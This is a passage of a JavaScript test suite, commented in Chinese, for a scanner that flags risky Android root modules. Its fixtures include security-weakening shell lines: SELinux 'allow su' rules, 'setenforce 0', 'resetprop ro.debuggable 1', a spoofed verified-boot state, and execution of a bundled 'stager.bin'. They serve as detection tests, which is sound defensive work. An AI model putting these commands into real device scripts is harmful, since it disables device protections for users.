  PRIVACY_HOME_USER: { payload: 'cp /home/realuser/x .' },
  PRIVACY_EMAIL: { payload: 'contact=author@realmail.com' },
  PRIVACY_SECRET: { payload: 'API_KEY=Ab3dEfGh1j' },
};

const REQUIRED_RULE_IDS = Object.keys(ANCHOR_WITNESS);

test('fix4-P14：锚点闭包表 —— 每条 line 规则声明 anchor，沉默必须有 witness，跳过与删规则都不算修好', () => {
  // ③-1 必备 id 清单：不许靠「把失败的那条规则删了」把这张表变绿
  for (const id of REQUIRED_RULE_IDS) {
    assert.ok(RULES_BY_ID[id], `${id} 不在规则表里 —— 锚点闭包不能靠删规则来「修」`);
  }
  assert.ok(CONTENT_RULES.length >= REQUIRED_RULE_IDS.length,
    `内容规则从 ${REQUIRED_RULE_IDS.length} 条缩到了 ${CONTENT_RULES.length} 条`);
  assert.equal(new Set(CONTENT_RULES.map((r) => r.id)).size, CONTENT_RULES.length, '规则 id 不许重复');
  // ③-2 witness 表与规则表互为定义：加规则要给 payload，删规则要删 witness，两个方向都拦
  for (const id of REQUIRED_RULE_IDS) {
    assert.ok(CONTENT_RULES.some((r) => r.id === id), `锚点表点名了 ${id}，规则表里却没有它`);
  }

  const ANCHORS = new Set(['line-start', 'anywhere']);
  let covered = 0;
  let anywhere = 0;
  let lineStart = 0;
  for (const r of CONTENT_RULES) {
    // ① 声明必须存在且合法 —— 默认值只许住在工厂里；这张表里写 `r.anchor ?? 'anywhere'` 就是装饰品
    assert.equal(typeof r.anchor, 'string',
      `${r.id} 没有 anchor 声明（实际 ${String(r.anchor)}）：沉默必须显式声明才成立`);
    assert.ok(ANCHORS.has(r.anchor), `${r.id} 的 anchor="${r.anchor}" 不在 'line-start' | 'anywhere' 里`);
    const w = ANCHOR_WITNESS[r.id];
    assert.ok(w && w.payload, `${r.id} 有 anchor 声明却没有锚点 witness —— 没人对账的声明是空话`);
    assert.equal(hits(r.id, w.payload).length, 1,
      `${r.id} 的 witness 载荷本身要恰好命中 1 条：${w.payload}`);

    if (r.anchor === 'anywhere') {
      anywhere++;
      const h = hits(r.id, ANCHOR_PREFIX + w.payload);
      assert.ok(h.length > 0,
        `${r.id} 声明 anywhere，但前缀行「${ANCHOR_PREFIX}${w.payload}」0 命中 —— 行首锚点又回来了`);
      assert.equal(h[0].ruleId, r.id);
    } else {
      lineStart++;
      // ② 声明 line-start 就必须指名那一支「脚本写出」的 sibling，且它真的打得住前缀形态
      assert.ok(w.prefixed, `${r.id} 声明 line-start 却没给出「脚本写出」形态的 witness`);
      assert.ok(r.anchorSibling, `${r.id} 声明 line-start 却没命名 sibling —— 声明必须有 witness`);
      const sib = RULES_BY_ID[r.anchorSibling];
      assert.ok(sib, `${r.id} 的 sibling="${r.anchorSibling}" 在规则表里不存在`);
      assert.ok(sib.anchor === 'anywhere' || sib.id === r.id,
        `${r.id} 的 sibling ${sib.id} 自己不覆盖行中形态（anchor=${String(sib.anchor)}）`);
      const h = sib.scan('service.sh', ANCHOR_PREFIX + w.prefixed).filter((f) => f.severity != null);
      assert.ok(h.length > 0,
        `${r.id} 的 sibling ${r.anchorSibling} 在前缀形态下 0 命中：${ANCHOR_PREFIX}${w.prefixed} —— 那一支是假的`);
      assert.equal(h[0].ruleId, sib.id);
    }
    covered++;
  }
  // ③-3 覆盖度地板：这张表一条都不许跳过（任何 `continue` 分支都会在这里露出来）
  assert.equal(covered, CONTENT_RULES.length, '锚点闭包表必须覆盖每一条规则，一条都不许跳过');
  assert.equal(anywhere + lineStart, CONTENT_RULES.length);
  assert.ok(anywhere >= 21, `anywhere 支只剩 ${anywhere} 条：规则不许悄悄退回行首锚定`);
  assert.ok(lineStart >= 2, `line-start 支只剩 ${lineStart} 条：两条 .prop 规则都要声明`);
});

test('fix4-P14：anchor 声明与规则自己的分支形状对得上（RELAX 改 anywhere，两条 .prop 规则声明 line-start 各有 sibling）', () => {
  assert.equal(RULES_BY_ID.SELINUX_POLICY_RELAX.anchor, 'anywhere',
    'P12 之后 RELAX 不再要求行首，声明必须跟着改 —— 否则下一轮又有人拿 anchor 当挡箭牌');
  assert.ok(!/^\^\\s\*allow/.test(RULES_BY_ID.SELINUX_POLICY_RELAX.pattern.source),
    `RELAX 的 pattern 还留着行首锚：${RULES_BY_ID.SELINUX_POLICY_RELAX.pattern.source}`);
  for (const id of ['PROP_BOOT_SPOOF', 'PROP_SECURITY_WEAKEN']) {
    const r = RULES_BY_ID[id];
    assert.equal(r.anchor, 'line-start', `${id} 的行首一支是真的（.prop 的键就在行首），必须声明出来`);
    assert.equal(r.anchorSibling, id, 'P13 的第二支就在同一条规则里：sibling 指向自己');
    assert.ok(r.pattern.source.includes('>>'), `${id} 的第二支要认得写出重定向，否则 sibling 是空的`);
    // 行首一支不许因为加了第二支而失效
    assert.ok(/^\(\?:\^|\\s\*\w/.test(r.pattern.source) || r.pattern.source.includes('^\\s*'),
      `${id} 丢了行首那一支：${r.pattern.source}`);
  }
  // 工厂负责物化默认值：每张规则对象上都得有这一个字段，而不是测试替它补
  for (const r of CONTENT_RULES) {
    assert.ok('anchor' in r, `${r.id} 的对象上没有 anchor 字段`);
  }
});

test('fix4-P14 端到端：同一族的前缀写法一起进报告，不再靠某一条邻居规则兜着', async () => {
  // 如实写着：这一份夹具在 P14 之前并不是 low —— `>> $MODDIR/system.prop` 被邻居规则
  // MODDIR_RUNTIME_WRITE 抓成 high（实测 eval.f4p14 旧行为：high，但只有那两条）。
  // 这里要证的是**这三条规则自己**都得说话：定级由邻居兜着，等于把「这一族看不看得见」
  // 押在一条意图完全不同的规则上；同一族的相对路径写法（P13 端到端）旧行为是 low → auto-approve。
  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p14', files: [
    ['module.prop', moduleProp('eval.f4p14')],
    ['service.sh', [
      '#!/system/bin/sh',
      'MODDIR=${0%/*}',
      'x=1; allow su * * { execute };',
      'x=1; printf "ro.boot.verifiedbootstate=green\\n" >> $MODDIR/system.prop',
      'x=1; printf "ro.debuggable=1\\n" >> $MODDIR/system.prop',
    ].join('\n') + '\n'],
  ] }), { changeType: 'first' });
  const ids = r.findings.filter((f) => f.line >= 3).map((f) => `${f.ruleId}@${f.line}`);
  for (const id of ['SELINUX_POLICY_RELAX', 'PROP_BOOT_SPOOF', 'PROP_SECURITY_WEAKEN']) {
    assert.ok(r.findings.some((f) => f.ruleId === id), `${id} 在前缀形态下仍然 0 命中：${JSON.stringify(ids)}`);
  }
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

// ===========================================================================
// fix5（第五轮）—— F1：文件名里的点被当成 dot-source 动词 / 命令位那一支把清理清单读成执行
// ===========================================================================
// 简报在 PerformanC_ReZygisk 的 stock update-binary 第 177-179 行实测到两条 high：
//   rm -rf \
//   $MODPATH/system/placeholder $MODPATH/customize.sh \        <- 实测 high
//   $MODPATH/README.md $MODPATH/.git* 2>/dev/null              <- 实测 high
// 而同一个文件第 153 行 `[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh` 才是真的 source。
// 上面那两行是上一条 `rm -rf` 的**参数续行清单**，一行里没有任何东西被执行。
// 实测归因（见任务报告）：这两条命中来自「命令位那一支」的**行首形态**，不是 dot-source 那一支；
// 两支都要收窄，理由不同，谁也不是装饰：
//   * dot-source 那一支：`.` 只有独立成词才是 source 内建，所以动词后面必须跟空白或 ${IFS}。
//     `.$MODPATH/x` 展开成 `.data/adb/modules/…` 那种相对文件名，`customize.sh` 里那个点更是文件名。
//   * 命令位那一支：行首形态的承诺是「这一行的第一个词就是被执行的模块路径」，而一整行都只是
//     模块路径清单、行尾停在续行反斜杠或重定向上时，它是上一条命令的参数表 —— Magisk 官方模板
//     就是这么写的，于是每个照抄模板的包都白送两条 high。
//   【fix6 更正】上面这一支的修法按「这一行自己的形状」判参数位，形状是投稿者挑的 ⇒ fail-open
//   （详见下面 fix6-F1 那一节）。承重的那条判据换成了「上一条物理行是否以奇数个反斜杠结尾」，
//   也就是逻辑行的命令位；本用例里那两条单行断言随之翻成「必须报」，第五轮的真收益（带
//   `rm -rf \` 上下文的清单沉默）由本用例的第二组断言和下面的端到端用例继续钉住。
// 收窄只作用于「报不报」：被引用的条目照样被 resolveBundledRefs 拉进扫描面（它跑原始 pattern，
// 不看 exclude），所以下面的端到端用例同时钉住「清单行不报」与「清单行引用的东西照样被读过」。

test('fix5-F1：`rm -rf` 续行的纯路径清单 0 命中；同文件那行真 source 仍 high', () => {
  const CONT1 = '$MODPATH/system/placeholder $MODPATH/customize.sh \\';
  const CONT2 = '$MODPATH/README.md $MODPATH/.git* 2>/dev/null';
  const REAL_SOURCE = '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh';
  // fix6 更正：本用例原来在这两行上断言 0 命中 —— 那正是第五轮留下的 fail-open（形状豁免脱离
  // 了上下文）。同一串字符单独成行时命令位就是那个路径，必须报；把它放回 `rm -rf \` 的续行里
  // 才是参数表，才该沉默。第五轮的真收益由下面那个端到端用例（带上下文的形状）继续钉住。
  for (const line of [CONT1, CONT2, `"${CONT1}"`, `"${CONT2}"`]) {
    assertHit('EXEC_BUNDLED_FILE', line, `脱离续行上下文时它就是执行：${line}`);
  }
  for (const line of [CONT1, CONT2]) {
    const t = ['rm -rf \\', CONT1, CONT2].join('\n') + '\n';
    assert.equal(hits('EXEC_BUNDLED_FILE', t, 'service.sh').length, 0,
      `回到 rm -rf 的参数位就不许报：${line}`);
  }
  // 第三行是真的 source：必须还是 high，且是这一行唯一的解释
  const h = assertHit('EXEC_BUNDLED_FILE', REAL_SOURCE, REAL_SOURCE);
  assert.equal(h.length, 1, `一行只该有一条发现：${JSON.stringify(h)}`);
  assert.equal(h[0].severity, 'high', `真 source 那行不许被顺手降档：${JSON.stringify(h[0])}`);
  // 命令位那一支本身不许被关掉：一个路径开头、后面是参数/重定向/到行尾，那仍是「直接执行」
  for (const line of [
    '$MODDIR/tool.bin',
    '  "$MODDIR/tool.bin" --help',
    '$MODDIR/tool.bin > /dev/null',
    '$MODDIR/payload.bin $MODDIR/cfg',
    '$MODDIR/payload.bin $MODDIR/cfg --force',
    '$MODDIR/payload.bin $MODDIR/cfg | tee log',
    'do_thing || $MODDIR/stage2.bin',
  ]) {
    assertHit('EXEC_BUNDLED_FILE', line, `行首命令位形态必须照旧说话：${line}`);
  }
});

test('fix5-F1：`.` 作动词要独立成词 —— 后接空白或 ${IFS}；`.$MODPATH/x` 是相对文件名', () => {
  for (const line of [
    '. $MODDIR/functions',
    '.  $MODPATH/customize.sh',
    '. ${MODDIR}/functions',
    '.\t$MODPATH/x',
    '. "$MODPATH/customize.d/00-verify-resources.sh"',
    '.${IFS}$MODPATH/x',
  ]) {
    assertHit('EXEC_BUNDLED_FILE', line, `真 dot-source：${line}`);
  }
  // 点后面紧跟名字字符 = 文件名的一部分，不是 source 内建：这里以前被 `\.(?!\\d)` 放过
  for (const line of [
    'cp .$MODPATH/payload /tmp/',
    'chmod 755 .$MODPATH/x',
    'rm -rf .$MODPATH/.cache "$TMPDIR/out"',
  ]) {
    assertNoHit('EXEC_BUNDLED_FILE', line, `点是文件名的一部分，不是动词：${line}`);
  }
});

test('fix5-F1 端到端：清理清单不再送 high，真 source 照旧，被引用条目照旧进扫描面', async () => {
  const ub = [
    '#!/system/bin/sh',
    'rm -rf \\',
    '$MODPATH/system/placeholder $MODPATH/customize.sh \\',
    '$MODPATH/README.md $MODPATH/.git* 2>/dev/null',
    '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh',
  ].join('\n') + '\n';
  const zip = makeModuleZip({ id: 'eval.f5f1', files: [
    ['module.prop', moduleProp('eval.f5f1')],
    ['META-INF/com/google/android/update-binary', ub],
    ['system/placeholder', 'setenforce 0\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const eb = r.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.deepEqual(eb.map((f) => f.line), [5],
    `清单那两行（3、4）不许报，真 source 那行（5）照报：${JSON.stringify(eb.map((f) => `${f.line}[${f.snippet}]`))}`);
  assert.equal(eb[0].severity, 'high', '真 source 那行仍是 high');
  // 豁免只作用于报不报：清单行引用的 system/placeholder 照样被读掉。
  // Task 2.7（fix10-P11）：它是可读文本，本来就在 feed 上 → 没有升级证人，但内容确实逐行扫过。
  assert.ok(r.scripts.some((s) => s.name === 'system/placeholder'),
    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
  assert.deepEqual(r.escalated, [],
    'system/placeholder 已在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
  assert.ok(r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
    `被引用的载荷必须真的被读过：${JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`))}`);
  assert.equal(r.riskLevel, 'high', '整包定级不因为这 FP 撤掉而变松');
});

// ===========================================================================
// fix5（第五轮）—— F2：DEBUGGABLE_ENABLE 不看值，把「把属性刷回安全值」当成罪状
// ===========================================================================
// 简报实测（snake-4/Zygisk-Assistant 的 post-fs-data.sh，这个模块的全部工作就是刷回锁定值）：
//   medium  resetprop_if_diff ro.secure 1        <- 加固，不是罪状
//   medium  resetprop_if_diff ro.debuggable 0    <- 加固，不是罪状
//   medium  resetprop ro.secure 0                <- 削弱，必须报
//   medium  resetprop ro.debuggable 1            <- 削弱，必须报
// 旧 pattern 的尾巴是 `[=\s]+[01]\b`：`0` 和 `1` 两个方向都收，于是它给这个包白送 2 条 medium，
// 把整包 medium 从 7 顶到 9 —— 报的还是「作者在恢复安全」这件事本身。
// 收窄必须和 .prop 那一侧一起收：fix3-P9 的 PROP_SECURITY_WEAKEN 认的是「具名键 + 削弱值」四对
// （ro.debuggable=1 / ro.secure=0 / ro.adb.secure=0 / service.adb.root=1），脚本侧以前只认两个键
// 且不看值。两边各写一份字面量就会各说各话 —— 所以键值对只许有一份，导出成常量，两条规则都从它生成。

test('fix5-F2：DEBUGGABLE_ENABLE 认得值 —— 加固值 0 命中，削弱值照旧 medium', () => {
  // 简报那四行的原样复现
  const WEAKEN = [
    'resetprop ro.secure 0',
    'resetprop ro.debuggable 1',
    'setprop ro.debuggable 1',
    'resetprop -w ro.adb.secure 0',
    'setprop service.adb.root 1',
    'resetprop_if_diff ro.secure 0',
    'su -c "resetprop -n ro.debuggable 1"',
    'resetprop ro.secure=0',
  ];
  const HARDEN = [
    'resetprop_if_diff ro.secure 1',
    'resetprop_if_diff ro.debuggable 0',
    'resetprop_if_diff ro.adb.secure 1',
    'resetprop_if_diff service.adb.root 0',
    'resetprop ro.secure 1',
    'setprop ro.debuggable 0',
    'resetprop -n ro.adb.secure 1',
    'setprop service.adb.root=0',
    'resetprop ro.secure 01',                   // 不是那个具名值
    'resetprop ro.secure 10',
    'resetprop ro.debuggable 12',
  ];
  for (const line of WEAKEN) {
    const h = assertHit('DEBUGGABLE_ENABLE', line, line);
    assert.equal(h[0].severity, 'medium', `削弱值仍是 medium：${line}`);
  }
  for (const line of HARDEN) assertNoHit('DEBUGGABLE_ENABLE', line, `这是安全值，不是 offence：${line}`);
});

test('fix5-F2：脚本侧与 .prop 侧共用同一份「键→削弱值」表，两个方向都不许各说各话', async () => {
  const PAIRS = (await import('./risk-rules.mjs')).SECURITY_WEAKEN_PAIRS;
  assert.ok(Array.isArray(PAIRS) && PAIRS.length >= 4,
    `两条规则必须从同一份导出的键值表生成，实际 ${JSON.stringify(PAIRS)}`);
  const OPPOSITE = { '0': '1', '1': '0' };
  for (const pair of PAIRS) {
    assert.ok(pair && pair.key && OPPOSITE[pair.weaken], `表里每一项都要是 { key, weaken }：${JSON.stringify(pair)}`);
    const { key, weaken } = pair;
    const safe = OPPOSITE[weaken];
    // 同一对 (键, 削弱值) 在两侧都得说话，同一个 (键, 安全值) 在两侧都得沉默 —— 少一项就是各说各话
    assertHit('DEBUGGABLE_ENABLE', `resetprop ${key} ${weaken}`, `脚本侧要认削弱值：${key} ${weaken}`);
    assertHit('DEBUGGABLE_ENABLE', `setprop ${key}=${weaken}`, `脚本侧要认 = 写法：${key}=${weaken}`);
    assertNoHit('DEBUGGABLE_ENABLE', `resetprop ${key} ${safe}`, `脚本侧不许把加固值当罪状：${key} ${safe}`);
    assertHit('PROP_SECURITY_WEAKEN', `${key}=${weaken}`, `.prop 侧要认削弱值：${key}=${weaken}`);
    assertNoHit('PROP_SECURITY_WEAKEN', `${key}=${safe}`, `.prop 侧不许把加固值当罪状：${key}=${safe}`);
    // 一种输入形状只许由一条规则说话，同一件事不许双报
    assertNoHit('PROP_SECURITY_WEAKEN', `resetprop ${key} ${weaken}`, '脚本那一行归脚本侧：' + key);
    assertNoHit('DEBUGGABLE_ENABLE', `${key}=${weaken}`, '属性文件那一行归文件侧：' + key);
  }
  // 两边的 pattern 都必须是从这张表生成的：表里每个键都出现在两条规则的 pattern.source 里；
  // 而表外的键两条都不许说话 —— 单边加键、单边删键、单边改值，三个方向都拦得住。
  for (const [id, rule] of [['DEBUGGABLE_ENABLE', RULES_BY_ID.DEBUGGABLE_ENABLE], ['PROP_SECURITY_WEAKEN', RULES_BY_ID.PROP_SECURITY_WEAKEN]]) {
    for (const { key } of PAIRS) {
      const esc = key.replace(/\./g, '\\.');
      assert.ok(rule.pattern.source.includes(esc),
        `${id} 的 pattern 里没有表里的键 ${key} —— 那份键表是抄的，不是同源的`);
    }
  }
  for (const key of ['ro.force.debuggable', 'debug.sf.hw', 'ro.boot.flash.locked']) {
    for (const v of ['0', '1']) {
      assertNoHit('DEBUGGABLE_ENABLE', `setprop ${key} ${v}`, `表外的键不许从脚本侧进来：${key}=${v}`);
      assertNoHit('PROP_SECURITY_WEAKEN', `${key}=${v}`, `表外的键不许从 .prop 侧进来：${key}=${v}`);
    }
  }
});

test('fix5-F2 端到端：把属性刷回锁定值的模块不再白送 medium，真削弱那行照旧报', async () => {
  const hardening = await scanToReport(makeModuleZip({ id: 'eval.f5f2a', files: [
    ['module.prop', moduleProp('eval.f5f2a')],
    ['post-fs-data.sh', ['#!/system/bin/sh',
      'resetprop_if_diff ro.adb.secure 1',
      'resetprop_if_diff ro.debuggable 0',
      'resetprop_if_diff ro.secure 1',
      'resetprop_if_diff service.adb.root 0'].join('\n') + '\n'],
  ] }), { changeType: 'first' });
  assert.deepEqual(hardening.findings.filter((f) => f.ruleId === 'DEBUGGABLE_ENABLE'), [],
    `恢复安全值不是罪状：${JSON.stringify(hardening.findings.map((f) => `${f.ruleId}@${f.line}`))}`);
  assert.equal(hardening.counts.medium, 0, `这四行不该顶高任何 medium：${JSON.stringify(hardening.counts)}`);

  const weakening = await scanToReport(makeModuleZip({ id: 'eval.f5f2b', files: [
    ['module.prop', moduleProp('eval.f5f2b')],
    ['post-fs-data.sh', ['#!/system/bin/sh',
      'resetprop_if_diff ro.adb.secure 1',
      'resetprop ro.debuggable 1',
      'resetprop_if_diff ro.secure 1',
      'setprop ro.adb.secure 0'].join('\n') + '\n'],
  ] }), { changeType: 'first' });
  const dbg = weakening.findings.filter((f) => f.ruleId === 'DEBUGGABLE_ENABLE');
  assert.deepEqual(dbg.map((f) => f.line), [3, 5],
    `同一份文件里的两条削弱值（第 3、5 行）都要报、三条加固值（2、4 与 shebang）都不报：${JSON.stringify(dbg.map((f) => f.line))}`);
  assert.ok(dbg.every((f) => f.severity === 'medium'), JSON.stringify(dbg));
});

// ===========================================================================
// fix6（第六轮）—— F1：续行豁免不许只看这一行的形状 —— 命令位判在**逻辑行**上
// ===========================================================================
// 第五轮为了抹掉 ReZygisk 的 update-binary:178/179 那两条 FP，给 EXEC_BUNDLED_FILE 加了一条
// 形状豁免：「整行是纯模块路径清单、行尾停在续行反斜杠或重定向上」就不报。形状是投稿者自己
// 挑的，于是它成了第六个可伪造的免死金牌。以下全部在第五轮的提交（5a5a3ff）上实测为 0 命中：
//   $MODPATH/payload $MODPATH/x \                            0 命中
//   $MODPATH/payload $MODPATH/x 2>/dev/null                  0 命中
//   "$MODPATH/payload" "$MODPATH/x" \                        0 命中
//   /data/adb/modules/eval/x /data/adb/modules/eval/y \      0 命中
// shell 的语义是：一行第一个 token 是路径 = **执行它**，后面的全是参数。所以
// `"$MODPATH/payload" "$MODPATH/x" 2>/dev/null` 真的把随包提交的那个文件跑了一遍，而扫描器
// 一个字都没说。豁免只有在「这一行确实处于参数位」时才是对的，而参数位与否由**上一条物理行
// 是否以奇数个反斜杠结尾**决定（`\\` 是转义反斜杠、不算续行），不由这一行自己的形状决定。
// 新判据四条同时成立才沉默（fail closed）：
//   ① 这一行是上一条的续行；
//   ② 拼出的逻辑行的命令位不是模块路径（是路径就是执行，照报）；
//   ③ 逻辑行的命令位是「只吃文件参数、不执行参数」的动词白名单里的词（rm/cp/chmod/chcon/…）；
//   ④ 这一行本身仍是第五轮那条纯清单形状（复用 isModulePathListLine，没有另起炉灶）。
// 四条都是收不是放：新豁免 ⊆ 旧豁免 ⇒ 命中只增不减，第五轮的真收益一条都没丢。

const FIX6_LIST_A = '$MODPATH/system/placeholder $MODPATH/customize.sh \\';
const FIX6_LIST_B = '$MODPATH/README.md $MODPATH/.git* 2>/dev/null';
const FIX6_LIST_C = '$MODPATH/payload $MODPATH/x 2>/dev/null';
const bs = (n) => '\\'.repeat(n);

test('fix6-F1：单成的「纯模块路径清单 + 续行反斜杠/重定向」一律照报 —— 命令位就是那个路径', () => {
  // 第五轮把这四种形状读成了「上一条命令的参数表」，可它们前面根本没有上一条命令：
  // 第一个 token 是路径，就是执行随包提交的那个文件。
  for (const line of [
    '$MODPATH/payload $MODPATH/x \\',
    FIX6_LIST_C,
    '"$MODPATH/payload" "$MODPATH/x" \\',
    '"$MODPATH/payload" "$MODPATH/x" 2>/dev/null',
    "'$MODPATH/payload' '$MODPATH/x' 2>/dev/null",
    '${MODDIR}/payload ${MODDIR}/x \\',
    '${MODDIR}/payload ${MODDIR}/x 2>/dev/null',
    '$TMPMODDIR/payload $TMPMODDIR/x \\',
    '/data/adb/modules/eval/x /data/adb/modules/eval/y \\',
    '/data/adb/modules/eval/x /data/adb/modules/eval/y 2>/dev/null',
    '   $MODPATH/payload $MODPATH/x 2>/dev/null',
    // 第五轮实测吃掉的正是 ReZygisk 那两行的形状 —— 单独成行时它就是「执行第一个路径」
    FIX6_LIST_A,
    FIX6_LIST_B,
  ]) {
    const h = assertHit('EXEC_BUNDLED_FILE', line, `行首命令位是模块路径：${line}`);
    assert.equal(h[0].severity, 'high', `这一行在执行随包提交的文件，不许降档：${line}`);
  }
});

test('fix6-F1：命令位判在逻辑行上 —— `rm -rf \\` 之后的清单照旧沉默（第五轮的真收益）', () => {
  const text = (head) => ['#!/system/bin/sh', head, FIX6_LIST_A, FIX6_LIST_B].join('\n') + '\n';
  for (const head of [
    'rm -rf \\',
    'rm -rf ${MODDIR}/old \\',
    'cp -af \\',
    'chmod 750 \\',
    'chown root:root \\',
    'chcon u:object_r:system_file:s0 \\',
    'restorecon -RF \\',
  ]) {
    const h = hits('EXEC_BUNDLED_FILE', text(head), 'service.sh');
    assert.equal(h.length, 0,
      `${head} 之后那两行是它的参数表，一行里没有任何东西被执行：${JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`))}`);
  }
  // 官方模板就是这个形状（ReZygisk 的 stock update-binary 177-179 行）—— 三个动词连写也照样沉默
  const chained = ['rm -rf ${MODDIR}/system \\', 'rm -rf \\', FIX6_LIST_A, FIX6_LIST_B, 'ui_print done'].join('\n') + '\n';
  assert.equal(hits('EXEC_BUNDLED_FILE', chained, 'service.sh').length, 0, JSON.stringify(hits('EXEC_BUNDLED_FILE', chained, 'service.sh')));
});

test('fix6-F1：伪造一条以反斜杠结尾的前导行不是免死金牌 —— 白名单外的命令位一律照报', () => {
  // 这一条是本轮的正面主张：豁免的成立与否只取决于命令位，而命令位是投稿者写出来的**动词**，
  // 白名单外的任何词（空操作、没见过的命令、eval、赋值前缀、解释器、路径本身）都不构成
  // 「这一行处于参数位」的立论依据。判不了就当它是执行。
  for (const head of [
    ': \\',                    // 空操作 + 续行：它确实不执行参数，但它也不在动词白名单里
    'foo \\',                  // 没见过的命令：判不了，fail closed
    'eval \\',                 // eval 会把它拼出来的东西跑一遍
    'xargs \\',                // xargs 把第一个参数当命令执行
    'env \\', 'time \\', 'sudo \\', // 前导类：后面的词就是要跑的东西
    'sh \\', 'bash \\', 'source \\', 'exec \\', 'nohup \\',
    'x=$MODPATH/probe \\',     // 赋值前缀：`VAR=… cmd args` 里 cmd 照样执行
    '$MODPATH/probe \\',       // 命令位本身就是模块路径 —— 整条逻辑行都是执行
    '"$MODPATH/probe" \\',
    bs(1) + ' echo ok',        // 前导行不以反斜杠结尾（这里反斜杠在行首）—— 第二行是新命令
  ]) {
    const t = [head, FIX6_LIST_C].join('\n') + '\n';
    const h = assertHit('EXEC_BUNDLED_FILE', t, `前导行 ${JSON.stringify(head)} 不构成立论依据`);
    assert.ok(h.some((f) => f.line === 2),
      `清单那一行（第 2 行）必须在发现里：${JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`))}`);
    assert.equal(h[0].severity, 'high', JSON.stringify(h[0]));
  }
});

test('fix6-F1：续行的判据是「行尾奇数个反斜杠」—— `\\\\` 是转义反斜杠，不是续行', () => {
  // 偶数个行尾反斜杠 = 一个转义后的字面量反斜杠，物理行到此为止 ⇒ 下一行站在命令位上
  const evenText = ['rm -rf "$MODPATH/old"' + bs(2), FIX6_LIST_C].join('\n') + '\n';
  const even = assertHit('EXEC_BUNDLED_FILE', evenText, '行尾 \\\\ 不是续行，第二行是命令位');
  assert.deepEqual(even.map((f) => f.line), [2], JSON.stringify(even.map((f) => `${f.line}:${f.snippet}`)));
  // 奇数个（3）才是续行：前两个拼成字面量反斜杠参数，第三个把命令接下去
  const oddText = ['rm -rf "$MODPATH/old"' + bs(3), FIX6_LIST_A, FIX6_LIST_B].join('\n') + '\n';
  assert.equal(hits('EXEC_BUNDLED_FILE', oddText, 'service.sh').length, 0,
    JSON.stringify(hits('EXEC_BUNDLED_FILE', oddText, 'service.sh').map((f) => `${f.line}:${f.snippet}`)));
  // 续行链上任意一行都共用同一个命令位：中间那行末尾又是反斜杠时，最后一行仍在参数位
  const deep = ['rm -rf \\', FIX6_LIST_A, FIX6_LIST_A, FIX6_LIST_C].join('\n') + '\n';
  assert.equal(hits('EXEC_BUNDLED_FILE', deep, 'service.sh').length, 0, JSON.stringify(hits('EXEC_BUNDLED_FILE', deep, 'service.sh')));
  // 但逻辑行一旦在清单之前收口，后面那行就重新站到命令位上
  const after = ['rm -rf \\', FIX6_LIST_B, FIX6_LIST_C].join('\n') + '\n';
  const h = assertHit('EXEC_BUNDLED_FILE', after, '第二行没有以续行结尾，第三行是新命令的命令位');
  assert.deepEqual(h.map((f) => f.line), [3], JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`)));
});

test('fix6-F1 端到端：`rm -rf` 续行的清单沉默，紧随其后的同形状攻击行必须报，扫描面不许缩小', async () => {
  const ub = [
    '#!/system/bin/sh',
    'rm -rf \\',
    FIX6_LIST_A,
    FIX6_LIST_B,
    '$MODPATH/webroot/stager.bin $MODPATH/webroot/cfg.bin 2>/dev/null',
  ].join('\n') + '\n';
  const zip = makeModuleZip({ id: 'eval.f6f1', files: [
    ['module.prop', moduleProp('eval.f6f1')],
    ['META-INF/com/google/android/update-binary', ub],
    ['system/placeholder', 'setenforce 0\n'],
  ] });
  const r = await scanToReport(zip, { changeType: 'first' });
  const eb = r.findings.filter((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.deepEqual(eb.map((f) => f.line), [5],
    `第 3、4 行是 rm 的参数表（不许报），第 5 行是攻击者挑的形状（必须报）：${JSON.stringify(eb.map((f) => `${f.line}:${f.snippet}`))}`);
  assert.equal(eb[0].severity, 'high', `第 5 行在跑随包提交的文件：${JSON.stringify(eb[0])}`);
  // 豁免只作用于「报不报」：被引用的条目照样被读掉。
  // Task 2.7（fix10-P11）：system/placeholder 是可读文本、本来就在 feed 上 → 没有升级证人，
  // 但「扫描面不许因为这条豁免而缩小」由它在被逐行扫过的清单里这一句钉住。
  assert.ok(r.scripts.some((s) => s.name === 'system/placeholder'),
    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
  assert.deepEqual(r.escalated, [],
    'system/placeholder 已在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
  assert.ok(r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
    `被引用的载荷必须真的被读过：${JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`))}`);
  assert.equal(r.riskLevel, 'high', '整包定级不因为这 FP 撤掉而变松');
});

test('fix6-F1：豁免不许把「上一行的动词」当成免检通行证传给整条逻辑行 —— 逻辑行内部仍是逐行判', () => {
  // rm -rf \ 之后跟的第一行确实是参数位；但同一文件里另一条以清单形状开头、前面没有续行
  // 关系的行，必须重新按命令位判。这条与上面那条端到端用例是同一条主张的两种粒度。
  const t = [
    'rm -rf \\',
    FIX6_LIST_A,
    FIX6_LIST_B,
    'ui_print "- done"',
    '$MODPATH/payload $MODPATH/x \\',
  ].join('\n') + '\n';
  const h = assertHit('EXEC_BUNDLED_FILE', t, '第 5 行前面是 ui_print，不是续行');
  assert.deepEqual(h.map((f) => f.line), [5], JSON.stringify(h.map((f) => `${f.line}:${f.snippet}`)));
});

// ===========================================================================
// 第七轮（Task 2.6）—— P15：`SELINUX_TYPE_PERMISSIVE` 的散文分支 / P11：名单外可读文本进扫描面
// ===========================================================================
//
// 两条都是实测出来的，不是推出来的（Temp 快照三方对照，见 §0.11 与本任务报告）：
